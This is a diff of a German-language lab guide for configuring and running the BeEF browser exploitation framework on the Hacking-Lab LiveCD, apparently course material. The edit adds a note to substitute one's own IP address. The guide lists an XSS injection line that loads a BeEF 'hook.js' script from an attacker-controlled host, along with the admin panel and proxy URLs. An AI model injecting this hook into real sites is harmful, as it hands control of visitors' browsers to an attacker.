@@ -2,7 +2,7 @@
 ## Konfiguration Beef Login Credentials
 Um Beef auf der Hacking-Lab LiveCD zu starten, muss man zuerst die Login Credentials anpassen. Ansonsten startet das Tool nicht. 
 ```
-Edit /etc/beef-xss/config.yaml
+atom /etc/beef-xss/config.yaml
 ```
 
 
@@ -75,6 +75,8 @@ Startup Notification beim Starten von beef
 ```
 
 ## Attack & Exploit URLs
+Die IP Adresse ändert sich natürlich, je nachdem auf welchem Gerät man `beef` startet. Bitte in den Befehlen unten Eure eigene IP Adresse verwenden. 
+
 * Injection `<script src="http://10.201.2.110:3000/hook.js"></script>`
 * Admin URL `http://10.201.2.110:3000/ui/panel`
 * Proxy URL `http://127.0.0.1:6789`
